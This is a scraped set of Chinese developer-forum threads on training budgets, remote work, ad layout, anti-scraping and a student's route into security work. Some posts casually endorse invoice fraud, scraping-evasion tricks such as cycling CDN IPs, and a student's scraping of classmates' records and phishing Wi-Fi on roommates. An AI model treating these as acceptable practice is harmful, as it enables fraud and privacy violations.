还是去搞个发票套现了，带老婆孩子吃顿好的吧", " 哈哈，实在", "学英语或者跳拉丁舞，没准学完就能脱单了", "oracle 不是有很多可以学的吗。 5K 都不够吧", "学英语根本不够好么, 起码得*3", "游泳 或者买辆入门的公路车 腰好腿也好 还会认识一大帮朋友 还能看风景 吃水果 吃肉 还能看妹子", "《论老司机的自我修养》", " 老公的培训费跟健身费都是这么操作的，钱不多，培训不够，折现了给家里买些小物件，全家都开心，更支持加班了==", "新东方，学嫖娼", " #15 6666 ，从删库到...", "可以买个储值卡，开个培训费的发票，再把卡卖给黄牛\r", "可能 95 折吧", "英语 时刻准备肉翻", "新东方 做挖掘机炒菜", "什么公司，公司还给经费给你们去学习技能。。。", "找个私教健身吧", "人人都在学机器学习深度学习，咱就别学这些了。可以考虑学习一下下一个热点。", "游泳和健身  真的，身体最重要", " 下一个热点是什么呢？", "话说公司每年也有培训费用，好像是应付年审的，从来就没落到实处！", "老司机", "你们正经点好不好", "去隔壁帖学 PHP 吧。", "找个拳馆一年的大课,可以把巴西柔术,泰拳,拳击一起学了,然后就可以打 mma", "大保健", "开发 DBA 还是运维 DBA 啊？", "上面这些靠谱点好嘛……\r", "建议楼主跟公司领导讨论把额度提高或者自己加钱，把 pmp 啃下来。", "5k 这个数有点尴尬啊", "英语", "加钱驾校学开车", "学谈恋爱吧，，，这个最实用", "吃顿好的 😄", "买～！书～！啊～！", "学 python ，我这里在线入门课只要 500 块，可惜没发票（逃~", "直接买 5000 块发票拿去报销", "挖掘机技术哪家强", "立马办一张按摩连锁机构的会员卡", "5k 的话, 加点钱办一张五星酒店的健身房会员卡, 这种健身房里的教练推销吃相比一般健身房里的销售型教练好太多...", "english", " 开发 dba", "口技", "蓝翔挖掘机 永不失业 比码农靠谱多了", " #31 健身费都被榨取 敢问他身材如何 您是认钱不认人的主？", "套现 +1", " 套现倒是可以接受，因为这个支持加班有点。。。", "当然是学人工智能了", "报考 高项 或者 pmp", " 我们小区有自带健身房，公司有健身房，健身房不过是变相发的福利费而已。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><b>游戏的名字叫：倔驴</b><br>\n<img alt=\"图片标题\" src=\"http://wx1.sinaimg.cn/mw1024/8db48fb7ly1fdvm0wsdyaj20800e8mxs.jpg\"></p><p></p>\n<p>当时做完之后觉得想写篇博客总结下，但是一直没做；\n游戏很简单，但是对于算法并不是很好的我来说也并不容易，经过一些推敲最终定了核心方案，实现了功能。</p>\n<p>明天的直播主要从以下几个方面跟大家交流下心得：<br>\n1 、游戏前期思考<br>\n2 、实现细分<br>\n3 、实现过程<br>\n4 、整合完善总结<br></p>\n<p>游戏设计使用的技术有： jq 、 html 、 css<br>\n所以感兴趣的朋友欢迎来我的直播间一起交流下啊~</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "下周开撸 LOL 比赛，明天直播一个 Html5 游戏开发", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因公司业务调整，非常遗憾的向大家宣布多说项目即将关闭。 我们将于 2017 年 6 月 1 日正式关停服务，在此之前您可以通过后台的数据导出功能导出自己站点的评论数据。 对此给您造成的不便，我们深表歉意，感谢您的一路相伴。</p>\n<blockquote>\n<p><a href=\"http://dev.duoshuo.com/threads/58d1169ae293b89a20c57241\" rel=\"nofollow\">http://dev.duoshuo.com/threads/58d1169ae293b89a20c57241</a></p>\n</blockquote>\n</div></div>"], "reply": "目前尚无回", "tittle": "第三方网站评论插件多说宣布关闭?数据你要怎么处理？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不是你们爽我就不爽的意思，而是看到了跟大家的差距，有这么几个问题：\n1.大家有技术问题，是 google 还是 Stack Overflow ？还是 cocoachina ？还是在 V2EX 发帖子？\n2.30 岁的初级程序员在北京有没有公司录用的，薪资大概什么水平？ 1 年、 2 年之后什么水平？\n3.程序员在三线城市的发展前景如何？在我们公司，做到技术管理，也就六七千的水平，温饱是没问题，小康就很紧张了，要实现财务自由更是不现实。回家乡意味着“家庭”和“梦想”只能二选一吗？</p>\n</div></div>"], "reply": "4", "tittle": "看大家聊的这么爽，我越发的难过了", "comment": ["1. 有问题就 google ，经常能 google 出 stack overflow 中的帖子。 cocoachina 是啥？\r", "2. 30 岁的程序员有，但是 30 岁还是初级程序员？中途改行吗？\r", "3. 不清楚在三线城市的发展前景。北上广深是一线，天津杭州之类算二线，郑州等省会是三线。这么算的话，程序员在三线城市也能发展。\r", "\r", "超过三十岁就别动不动梦想了。大部分人的梦想说得好听，戳穿了就一句话，多赚钱。", "楼上说的很对", "楼上说得对", " \r", " \r", " \r", "其实意思就是为了多赚钱。如果按照 1 楼的说法，这边算是 4 线城市了，这边程序员发展的天花板很低，普通程序员到 56 千好像就到顶了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>孩子马上要上幼儿园，感觉在北京待着很难了。公司可以申请在家（济南，房子在高铁旁边）远程办公，刚跟老板沟通了下，老板也挺痛快的答应了。就怕工作一段时间工作没了，到时候不上不下的又很难受，没有过来人给些建议？</p>\n</div></div>", "<div class=\"topic_content\">谢谢各位建议。\r<br>1 、对于远程办公，公司做的还是可以的，有 vpn/hipchat/webex/lync 之类的工具在用，之前也要几个同事长期在家办公，有个已经在外地待了两年多了，公司还是挺倡导的。\r<br>2 、对于拖延症的问题，目前项目在用 jira 管理，且每天有晨会，每两周有项目会约束，应该能辅助提高下自制力\r<br>3 、最担心的就是公司的稳定性。之前团队动荡过几次了，大分裂也有过，裁人也有过，不过最近在融 A 轮，应该以后能好点</div>"], "reply": "24", "tittle": "关于在家办公，各位有什么建议吗？", "comment": ["不会呀，你没签劳务合同吗？\r", "每周主动去公司工作一天。", "同济南，远程办公估计悬...国内这种方式的还不太多，干段时间工作没了倒不会，毕竟签了劳动合同的", "没碰到过，不过要是你工作都按时完成，没理由工作没了", "除非你干的工作是实在没所谓的，否则不会随便开除你再去招新人。\r", "招一个合适的新人再花时间培训到能发挥生产力，企业得亏死。\r", "另外你在家办公的话，一天不一定只工作那么几个小时吧，说不定还给老板免费加班了。", "听哥一句劝，先治好拖延症再说远程办公的事。", "只要在家坐着，即使脑里在想事情，家里总有人会觉得你在偷懒的。家人打断你工作的频率更高，无论大小事。", "如果公司在处理 remote 这块没什么经验，过阵子黄的概率不小心, 因为沟通效率会打折扣是一定的\r", "\r", "在老家也不建议在家里办公， 因为各种家庭琐事和人情事故会极大分散你注意力， 久而久之就会形成拖延症", "如果能保证专注我觉得也没什么", "在家乡，不要在家里。\r", "\r", "做好时间被打散的准备。\r", "\r", "看看自己的孩子，想想他的未来，提醒自己不要拖延不要拖延不要拖延。", "克服拖延症", "已入拖延癌晚期，我已经废了··\r", "So 极度不建议宅家办公，就算远程也不要在家", "每天保证跟上班族一致的工作时间即可。\r", "公司动荡的话也是没办法的事儿。毕竟通常只有这种早起阶段的公司才更支持 work from home 一些。", "目前来看 需要融资的公司都不是啥好业务", "真羡慕能 remote work 的公司啊，我也在济南", "租个工位坚持上下班，别天天窝在家里", "暂时不太看好远程办公。", "在家太安逸了，完全没有工作的心情。", "我想最大的问题可能是拖延症，病因其实是计划，如果你习惯用 gtd 的话并不是一个非常大的问题。可以尝试下 org-mode 或者 omnifocus", "如果白天家里没人可以的，如果有个小孩啥的你就完了。\r", "\r", "我以前远程时同时要带娃+早中晚饭+家人不理解，后来我搬出去住了", "拖延症\r", "远程\r", "在家\r", "\r", "操", "在家办公半年多了，我的几点感受。\r", "\r", "1/ 如果孩子跟你生活在一起，还是去租个工位或者找个适合办公的地点。\r", "2/ 选择了 remote ，那么要努力降低对公司的依赖。 主要应对可能发生的不确定因素。 对于本身提倡和支持的公司这条自动忽略.\r", "3/  拖延症患者，对时间缺乏管理和没有计划任务的人慎重。\r", "\r", "在家办公，目前感受就是时间自由了，只要合理的安排好工作时间和任务计划，剩下的时间就是你自己的了，接下来你可以干任何你觉得开心的事情", "在家办公，首先要克服人性的懒惰", " 那么怎么寻找在家办公的公司呢？", " \r", " \r", "1 、有我妈妈帮忙带孩子，而且孩子平常算是乖巧，只要有陪他玩的就不会粘我，而且上幼儿园之后有大半天的时间应该没人打扰。\r", "2 、也是打算在自己时间充裕的时候多学点东西，充实自己"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/hacker.svg\" rel=\"nofollow\"><img alt=\"hacker\" src=\"https://rawgit.com/aleen42/badges/master/src/hacker.svg\"></a> A badge used for hacking projects (<strong>Business Using is not allowed</strong>)</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/github.svg\" rel=\"nofollow\"><img alt=\"GitHub\" src=\"https://rawgit.com/aleen42/badges/master/src/github.svg\"></a> A badge used for GitHub repositories</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/npm.svg\" rel=\"nofollow\"><img alt=\"npm\" src=\"https://rawgit.com/aleen42/badges/master/src/npm.svg\"></a> A badge used for npm packages</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/react.svg\" rel=\"nofollow\"><img alt=\"react\" src=\"https://rawgit.com/aleen42/badges/master/src/react.svg\"></a> A badge used for repositories which has used the framework, React</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/redux.svg\" rel=\"nofollow\"><img alt=\"redux\" src=\"https://rawgit.com/aleen42/badges/master/src/redux.svg\"></a> A badge used for projects using React Redux</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/router.svg\" rel=\"nofollow\"><img alt=\"router\" src=\"https://rawgit.com/aleen42/badges/master/src/router.svg\"></a> A badge used for projects using React Router</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/angular.svg\" rel=\"nofollow\"><img alt=\"angular\" src=\"https://rawgit.com/aleen42/badges/master/src/angular.svg\"></a> A badge used for repositories which has used the framework, Angular</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/eslint.svg\" rel=\"nofollow\"><img alt=\"eslint\" src=\"https://rawgit.com/aleen42/badges/master/src/eslint.svg\"></a> A badge used for projects using ESLint</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/gitbook.svg\" rel=\"nofollow\"><img alt=\"gitbook\" src=\"https://rawgit.com/aleen42/badges/master/src/gitbook.svg\"></a> A badge used for Gitbook projects</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/atom.svg\" rel=\"nofollow\"><img alt=\"atom\" src=\"https://rawgit.com/aleen42/badges/master/src/atom.svg\"></a> A badge for the Atom editor</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/sublime.svg\" rel=\"nofollow\"><img alt=\"sublime text\" src=\"https://rawgit.com/aleen42/badges/master/src/sublime.svg\"></a> A badge for the Sulime Text editor</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/visual_studio.svg\" rel=\"nofollow\"><img alt=\"visual studio\" src=\"https://rawgit.com/aleen42/badges/master/src/visual_studio.svg\"></a> A badge for the Visual Studio IDE</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/bower.svg\" rel=\"nofollow\"><img alt=\"bower\" src=\"https://rawgit.com/aleen42/badges/master/src/bower.svg\"></a> A badge used for bower packages</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/gulp.svg\" rel=\"nofollow\"><img alt=\"gulp\" src=\"https://rawgit.com/aleen42/badges/master/src/gulp.svg\"></a> A badge used for projects using gulp to build</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/grunt.svg\" rel=\"nofollow\"><img alt=\"grunt\" src=\"https://rawgit.com/aleen42/badges/master/src/grunt.svg\"></a> A badge used for projects using grunt to build</li>\n<li><a href=\"https://rawgit.com/aleen42/badges/master/src/medium.svg\" rel=\"nofollow\"><img alt=\"medium\" src=\"https://rawgit.com/aleen42/badges/master/src/medium.svg\"></a> A badge used for articles published on the Medium</li>\n</ul>\n<p>flat badges 在我们的文档书写当中经常会看到，但你曾否想过它们还能是如此可爱？本项目就是为了让大家能傻瓜式地制作出属于自己的 badges 并使其能广泛地被运用到各个项目中： <a href=\"https://github.com/aleen42/badges\" rel=\"nofollow\">https://github.com/aleen42/badges</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "希望 flat badges 能被广泛应用", "comment": []},
{"content": ["<div class=\"topic_content\">感觉这篇写得挺中肯的：\r<br><a target=\"_blank\" href=\"http://jlongster.com/How-I-Became-Better-Programmer\" rel=\"nofollow\">http://jlongster.com/How-I-Became-Better-Programmer</a></div>"], "reply": "2", "tittle": "How I Became a Better Programmer", "comment": ["首先你要先有女|男朋友，老子说得好，一名成功的男人背后都有一位强大的男人", "How I Became a Better Coder"]},
{"content": ["<div class=\"topic_content\">最近看到个疑似微信红包的算法\r<br>public static double getRandomMoney(LeftMoneyPackage _leftMoneyPackage) { \r<br>\t// remainSize 剩余的红包数量   \r<br>\t// remainMoney 剩余的钱   \r<br>\tif (_leftMoneyPackage.remainSize == 1) {\r<br>\t\t_leftMoneyPackage.remainSize--;      \r<br>\t\treturn (double) Math.round(_leftMoneyPackage.remainMoney * 100) / 100;  \r<br>\t}    \r<br>\tRandom r  = new Random();\r<br>\tdouble min   = 0.01; //\r<br>\tdouble max   = _leftMoneyPackage.remainMoney / _leftMoneyPackage.remainSize * 2;\r<br>\tdouble money = r.nextDouble() * max;\r<br>\tmoney = money &lt;= min ? 0.01: money;\r<br>\tmoney = Math.floor(money * 100) / 100;\r<br>\t_leftMoneyPackage.remainSize--;\r<br>\t_leftMoneyPackage.remainMoney -= money;\r<br>\treturn money;\r<br>\t} \r<br>}\r<br>代码很简洁 也能实现红包的功能，但是我发现第一个抢红包的会有个最大封顶值。。。有没有其他算法来实现均衡呢</div>"], "reply": "2", "tittle": "有没有绝对均衡的红包算法？", "comment": ["刚发的贴显示居然是一天前 是被降权了吗\r", "\r", "平分。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前做了一个图片站，想尽可能提高 adsense 的广告点击率而不触及 adsense 的红线，想了一种布局方式如下：\n<img src=\"http://pic.027cgb.cn/20170304/20173213291297448713.jpg\"></p>\n<p>横向方框代表图片，为了防止广告和图片混淆，我在中间穿插了一个 300x600 的 adsense ，这么做会不会被 adsense 认为不合法？</p>\n</div></div>", "<div class=\"topic_content\">这个图床真垃圾，图片被替换了。。。</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>重新换上图片：\n<img src=\"http://i4.buimg.com/1949/bda2839955cc0dd5.jpg\"></p>\n</div></div>"], "reply": "7", "tittle": "大家看看我这种网页广告布局能不能行？", "comment": ["危险，有些站没问题，有些站因为这个被 K", "广告位置需要有明显的 广告标识", "可以吧，只要间隔足够", "流量小的站这样布局点击率高的话很容易被 K", " \r", "\r", "这个是不是也是你的帖子？\r", "广告中国上面发了，又来 V2 …… 也是醉了", "应该没问题", "这种广告布局的网站很多，比如这个\r", "\r"]},
{"content": ["<div class=\"topic_content\">想找人用这个 CMS 帮朋友建一个站，有什么坑？</div>"], "reply": "4", "tittle": "有朋友对基于 node.js 的 keystone.js 熟悉吗？", "comment": ["你能说一下不用 wordpress 的理由么？", "没学过 php\r", "如果确定用 node ，那我感觉 keystone 是个不错的选择，最近我也在捣鼓这个", "我开始也打算用这个，后来放弃了，学习成本还不如自己写一个"]},
{"content": ["<div class=\"topic_content\">同事在测试一个段代码， 600 并发每秒。\r<br>里面还是有操作数据库的，同步操作。\r<br>我感觉好厉害啊。</div>", "<div class=\"topic_content\">在本机测试 innodb 机械硬盘\r<br>字段 11 个\r<br>数据一共 3 行\r<br>code 为主键，无其他索引\r<br>\r<br>带事务更新一个字段\r<br>\r<br>单线程操作 60s\r<br>结果执行了第一次 1976 第二次 2085 没有必要第三次了\r<br>\r<br>就是每秒 32 次</div>", "<div class=\"topic_content\">他们把心思放在怎么分布式的锁获取和超时，然后控制每次最大线程 600 就是允许 600 并发操作每次，其实没有这个必要，允许 10 到 50 左右就够了。资源有限的。</div>"], "reply": "68", "tittle": "同事在测试一个段代码， 600 并发每秒。", "comment": ["exm ？", " 实际上影响并发的是业务操作，即使用了锁，多线程等等。最终还是看业务执行 的速度。反而他们把心思放在并发和锁上面了。", "并发是并发,QPS 是 QPS,你说的 600 是个啥.....", " 就是一秒请求 600 个更新操作。我也不知道是什么，别打我。", " \r", "那就 600 个请求每秒嘛....\r", "单机扛 600QPS 挺正常的....", " 这个叫 600TPS ，一点儿都不高", "这个很低好吗。。。", "一个段代码， 233", "你是不是喜欢他？", "你看一下他的表引擎是不是 memory ？", "黑线…", "你是不是喜欢他？", "你是不是喜欢他？", "你是不是喜欢他？", "你应该喜欢他的吧.", "你是不是喜欢他？", "你喜欢他", "这还用说，他心里有人了", "肯定是喜欢上他了。", "怎么楼就歪了？你是不是喜欢他", "你是不是喜欢他？", "600 并发很正常吧. 话说你是不是喜欢他？", "你是不是喜欢他？", "毋庸置疑，你肯定喜欢他", "。。。。", "喜欢他，就在一起吧", "感觉你是有点儿倾慕你的同事，上吧，皮皮虾", "。。画风突变啊", "突然歪楼。。。", "600QPS 我的垃圾新闻站都能阿里云低配抗住", "你是不是喜欢上他了", "你是不是喜欢他？", "应该是喜欢上他了， ps 600 的 QPS 蛮不错了，你单机可以抗 600 么？@realpg", "随随便便压读 2000 ，写 800 。机械盘。", " #33 \r", "必然可以。我的服务器从来都是低配的不能再低，全是压性能。", "你是不是喜欢上他了", "你是不是喜欢他？", "600 ？ 6W 才差不多", "在一起！", "某厂架构师说的 golang 单机随便 2w .", " 并发不是瓶颈， sql 写，怎么上 2w? ssd 都扛不住。", "你是不是喜欢上他？", "你是不是喜欢他？", "你是不是喜欢他？", "他是不是喜欢你？", "到底谁喜欢上谁？", "qps\r", " \r", "\r", "不上数据库或者只连 redis 的确随便 2w 啊\r", "\r", "关键数据库啊", " \r", "\r", "走数据库么？", " 写还是好办。异步写。读的话要做好麻烦点。", " #48 \r", "当然是数据库 要不怎么能这么低的量级\r", "走 redis 那不是分分钟五位数的量级了", "你是不是喜欢他？", "你是不是喜欢他？", "数据才 3 行啊，填充 30 万行数据看看效果怎么样。不过这个不重要 ，重点是 你是不是喜欢他？", "建议你学习一下表达能力，不知道你要说什么。不过这个不重要，喜欢他就大胆去追，光在这个表白也没用。", "不知道有什么好比的，读还是写没说，单次操作复杂度也没说，表大小也没说，不就是啥都没说。", "600 并发很 easy 啊~不过这个不重要，喜欢他就直接说吧", ":hhh", "喜欢就上", "楼歪地触不及防", "感觉这楼太歪了。不过这个不重要，喜欢就大胆的说出来，你可以的。", "你是不是喜欢他？", "看到楼上笑哈哈", "1 秒 600 很高？\r", "楼主是来买萌还是搞笑的？", "喜欢他就要说出来", "弯前留 mark", "下药", "啧啧", "电脑配件"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>完全做到反爬虫肯定是个伪命题，反爬虫只能最大限度地去遏制，而不是杀绝，这几天一直在构思怎样将我辛辛苦苦的原创内容加以保护别被爬了，但杀爬虫杀得太猛把可爱的搜索引擎蜘蛛们也赶尽杀绝了，所以想了一种简单的方法:</p>\n<ol>\n<li>把 header 包含有 bot 和 spider 的 ip 后台暂时放行，加入队列，后台 daemon 进程逐一验证其 host 地址是否为搜索引擎</li>\n<li>验证客户端的 cookie ，我使用的是 Google analytics ，没有诸如“_ga ”或者“_gat ”之类的 cookie 把它 ban 了</li>\n<li>在页面角落处插入一个隐形的动态图片： src=\"checkScraper.php\" width=\"0\" height=\"0\"，没加载这个图片的 ip 也给 ban 了</li>\n</ol>\n<p>上面这个 ban 了不是指给他抛出一个 400 错误，而是逐渐延迟加载时间，让采集者不能发现， php: sleep($i)，$i 表示请求次数</p>\n<p>大家觉得是否可行，或者我在这抛砖引玉一下，除了通常的蜜罐法（烂大街了，我采集网站都是先看对方 robots.txt 有没有蜜罐），或者限制 ip 频率法（误伤蜘蛛），大家有没有更好的方法？</p>\n</div></div>"], "reply": "57", "tittle": "突然想到一种简单的反爬虫方法，大家觉得可行性如何？", "comment": ["你说的这三点，只要是针对你网站去爬的，不都可以伪造么……", " 同时满足这三点的，估计一大部分都过滤掉了吧", "现在爬虫图省事直接用真实的浏览器去爬了。还是高级验证码什么的靠谱点。", "我都是屏蔽所以 analytics js 的。", " 我写爬虫很少用浏览器去爬，要不对方一下流量突然暴涨，肯定要追查 ip 的", "我忘记了域名是什么了\r", "就是显示很多域名注册商 域名注册量 还有 isp 的 IP isp 的 ip 绑定了多少网站\r", "使用的 webserver 等等 一个统计网站\r", "\r", "最早的时候 我是拿来抓淘宝新绑定的网店域名 二级域名 然后干些不可描述的事\r", "\r", "后来抓不到\r", "那边加了个 Cookies 有效期验证 这个我尝试 N 多方法 爬不到数据\r", "无论如何 都爬不到  但是人工访问没问题\r", "\r", "好像的算法是这个逻辑\r", "A 访问页面 生成一个 cookies 这个信息是加密的 包括有效期\r", "A 在访问其他页面 解密 验证 cookies 算有效时 有效放行 无效 显示 spam 验证", " 搜索引擎支持 cookie 么？不会吧可爱的小蜘蛛也给误杀了？", "只要你的网站能正常访问，就没法屏蔽爬虫，这个事情好无聊", " 封 IP 什么的都是浮云,  \r", "我也遇到封 IP 但是使用变态方式解决了 \r", "直接拿 AKAMAI 的 CDN 去绑源站 ,  然后利用 AKAMAI 的 N 多 IP 轮番上阵 \r", "左一遍又一遍的把别人网站轮的不要不要的.......", "  新一代的爬虫都支持 cookie , 而且可以解析 js 内容了 差不多和人访问的区别不大\r", "不要认为还是以前 爬网页 只是提取文本和图片内容", "这两天发现一个没碰到过的防爬例子，\r", "用 css display: inline-block;width: auto 穿插着自动显示文本，蜘蛛和爬虫互不影响\r", "网址： ", "说一下，以前公司遇到爬虫都是吐脏数据的", " 这个有点贱，不怕对方报复么", " 这个。。。蜘蛛没法识别了吧，全是 css 显示文本。。。", "百度知道在你大量访问的时候，返回的是字的图片，就是几个字中间出现一个图片的字，用户看起来没有区别，爬虫就爬不到所有的字。", "你还是研究下机器学习...能自住修改反爬规则", "我是每个 session 都随机新建一个密码。然后在输出页面里用这个密码对称加密。在页面 head 里放一个外部 js ，在这个 js 是用 php 生成的，将替换的字替解密换回去。因为 head 里的 js 会阻塞显示，所以用户根本看不出文字错误。但查看源码是一堆乱码。\r", "为了防止复制，这些解密后的字符是通过 canvas 绘制到页面中的。再加点与用户对应的水印最好。\r", "有本事就去逐行调试 js 。", " 你想多了，要满足这三点太简单了， V2 的 API 调用限制了每 IP 每小时 120 次，照样都把三十万帖爬下来了，关键就看要不要爬而已", "发现爬虫直接返回假数据怎么破。", "太简单了，根本防不住。\r", "\r", "要防爬虫，最彻底的就是让程序抓取到内容也无法解读，而人类却能一眼看懂。\r", "\r", "我想到的一个办法是字体替换，类似于“ Font Awesome ”，动态生成字体映射文件，人类看到文字是有意义的文字，而程序抓取出来却是“ asdf ”这样无意义的文本。", " 但是这样对搜索引擎是不是就不友好了?", " 可搜索引擎不就是一种爬虫么", "你用 css 这么复杂，你自己更新就很容易？其次你觉得你的网站有这么值钱的信息让爬虫这么感兴趣？如果真感兴趣，你这个手段也行？", " 这个我也遇到了\r", "我觉得去掉一些字和标点用处不大吧?\r", "只是,自然语言处理它的时候,分句分词可能都出问题.\r", "这个手段直接调最终的 DOM 接口就能把它还原出来.", " 所以又防爬虫又对搜索引擎友好的就是不可能的\r", "只有那种数据都不想被搜索到的网站可以用这种方式", "我有程序可以跟浏览器一样的访问网页，你这策略，跟没有一样", "用 headless browser 采集 这些方法都不太管用。", "攻防就是一个成本与收益的问题。\r", "\r", "这些做法会增加爬虫成本，就看爬你网站的收益够不够覆盖成本了~\r", "\r", "但是你这是一个个人站，原创内容，那肯定内容不多，就得看你这内容是不是真有料了。", "那个...你知道 火车头浏览器  吗？", "其实只要用户能看到的东西，就能采集起来，大不了你做成图片我来 OCR 识别嘛，至于什么封 IP ，验证 cookie 什么的，那就用真实浏览器+代理+脚本咯", "可以的, 把所有内容弄成动态加载...", "google analytics ，会被 adb 拦截", " 额。。。我的广告同样也被拦截了，我凭啥还让这个人访问我的网页？？", "朋友，留下你的原创内容地址 /奸笑", " 猫眼的一些数据就是这种显示 ", " 图像识别什么的是很好玩啊，不过我还是觉得用他说的第一种方法比较快", " 但是现在爬虫也用机器学习（主要是内容识别提取方面），将来机器学习人类浏览网站的习惯，模拟人类。最后演变成 AI 大战了。[doge]", " 请教一下怎么还原？我采集就是用来分词的。谢谢哈。", "直接去搜索引擎拿快照，手动斜眼", "又要支持搜索引擎，又要反爬虫，不是自相矛盾吗", "爬虫反不了的。\r", "我觉得 @", " 说得对，爬虫搞到后面就是 AI 的斗争。\r", "现在爬虫界最难搞的算是 Google 的那种点击的验证码和滑动验证码。\r", "以极验为例，就很难搞。后台机器学习出模型，前台的滑动数据给后台验证。验证不过就不让访问（ AI 反爬虫）\r", "作为爬虫方要做的就是怎么让机器滑出来的轨迹能被对方接受，也需要用到数据搞机器学习（ AI 爬虫）", " 极验证也可以破解。我之前公司就用那个 就被破解了", "没访问 10 个页面弹一个 recaptra", "分析 nginx 日志  对于 pv 过多的 isp ，属于机房的相似 ip 将其加入黑名单，首次访问即弹 recaptra", "对搜索引擎的 IP 段都显示正常纯文本内容，其他 IP 包括用户用楼上的各种牛逼反爬方式，但是需要收集搜索引擎 IP", " \r", "这么巧，刚好有人让采集这个。前后用了好几个小时才找到了通用的方法。", " \r", "其实，真的是一行一行调试的，我就干过。和你的思路差不多，变量名随机，函数名随机，逻辑结构都是随机的。", "道高一尺，魔高一丈。除非你一直更新策略，否则没有一劳永逸的对策。最近很火的人工智能自我学习倒是个有可能持续起作用", "这思路并不新 而且也不难实施  但是没有什么实际的用\r", "只要人家想抓 怎么都能抓\r", "\r", "内容防盗更多的是需要技术之外的东西", " ", "不如每次看你的网站，都要发手机验证码好不好", " 很好奇 cdn 这个，具体是怎么做？", " 猫眼这个厉害了", "  请教一下,怎么用浏览器爬的", " 谢谢啊", " \r", "每个标点或者常用字都是一个 span 标签,用她的 class 来表示是逗号还是句号等.\r", "但 class 名称对应哪个汉字,这个每次都在变.\r", "每一楼有一段 javascript,uglify 后的.class 名称到汉字的对应关系,就在这里.执行 js 代码的过程中,js 调用了 DOM 接口,把相应的 css rule 插入到该 class 的节点中(设置了 content 属性),汉字就显示出来了.\r", "\r", "根据上面的原理,我们不必管它 js 里面做了什么,只要看懂它最终调了哪个接口(我记得好像是 style node 的 insertRule 函数),用自己的函数将它替换,就能得到 class 到真实汉字的对应关系.\r", "大体的思路就是这样.\r", "\r", "比较罗嗦,希望我说明白了 :)", "只要针对你的爬虫都没用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>题主的学校只能说是三流本科。虽然不是三本，但排名在本科院校中是倒数。</p>\n<p>大二的时候对信息安全感兴趣，一直在捣鼓这个。没人教，都是自己瞎折腾。看到知道创宇技能表上有句话叫不会编程的黑客，犹如不会游泳的海盗。然后我就学习了 Java ，当时学校也恰好开设了这门课。</p>\n<p>然后也没有什么用来练手的东西。就从学校开刀了。用 Java 写了一些小工具，例如密码爆破工具，蜜罐， Nmap 扫描结果提取工具，学籍信息爬虫这些小东西。看着自己写的程序，把众多学籍信息爬去下来保存到数据库再输出到控制台。控制台上面的信息噌噌噌的翻页，说实话，当时挺有成就感的。</p>\n<p>后来学校陆陆续续开了一些跟网络相关的课程。 TCP/IP 协议分析这些课程。之后就了解到了网络安全相关的东西。也知道了拒绝服务， ARP 欺骗这些攻击方式，还自己用虚拟机跑 KaliLinux 玩了玩。当时开了一个钓鱼 WIFI 让室友连接，发现了很多秘密，当时觉得挺好玩的。</p>\n<p>后来从知乎上接触到 Web 安全，按照知乎上的答案来讲，就是 Web 安全是很好的切入点。然后噌噌噌的推荐了一大票书籍。其中有一本是《白帽子讲 Web 安全》。这本书里面的很多东西当时都看不懂，特别是前端安全这块。 JavaScript 根本就没接触过，还有什么浏览器的同源策略。说实话，之前从来都没关注过浏览器。然后我是自学了一些前端开发技术才知道不同浏览器有不同的内核，它们渲染网页的方式都不同，对各个 HTML 标签支持的程度也不同。从 HTML 到 CSS ，再学到 DOM 树，前端安全这块基本上算是看懂了。后端安全的话，也是自己学了 Servlet ， JSP 和 JDBC 后才搞懂。搞清楚漏洞形成的原理后，后来这本书就放在那里吃灰了。</p>\n<p>然后就是秋招了。发现做安全的公司很少，好多公司都感觉挺高大上，对于我这种学校的学生来说。但是也去投了简历，简历上就放了一些自己曾经写过的小工具，压根没放在心上。结果没想到居然打电话过来了。</p>\n<p>面试官问了一些基础的东西，例如 HTTP 报文格式，滑动窗口， TCP 连接的三次握手。后来又问了一些开放性的问题，例如对 SQL 注入的理解。感觉自己答得不怎么好，可以说是知其然，但并不是知其所以然。好多东西都没有自己的见解。后来面试官问了问我在校的经历，还有以前做过的一些小东西。面试官说：做安全，主要是思路。编程只是一部分。想想自己也是，好多东西仅仅局限于弄懂，但并没有去深入想过。我问面试官：安全如何才能做到优秀。面试官给我说了一些职业发展方向，一个是代码审计，一个是渗透测试，还有个是 Web 和移动端安全。后来谈到代码审计，我问能够理解漏洞形成的原理，并且能够写一些演示代码，是不是可以胜任这个岗位？面试官似乎很有兴趣。但我觉得代码审计不可能只看 Java 和 JS 代码，我觉得优秀的代码审计师应该要能看懂主流的编程语言代码。我说 PHP ， Python 这些我都没接触过， JS 也只懂点皮毛。面试官说这些都没关系。后来谈到渗透测试，我觉得我对渗透测试兴趣更大。代码审计的话，想想都觉得好枯燥。而且挖出来的漏洞被修复，就感觉失去了意义。感觉面试官语气有些失望，问了问我的发展方向就结束了面试。</p>\n<p>后来没去成这家公司。可能是这家公司不招渗透测试，更多的是我觉得是自己表现不够好，主要是自己太弱了。都没有在乌云提交过漏洞，也没有 CTF 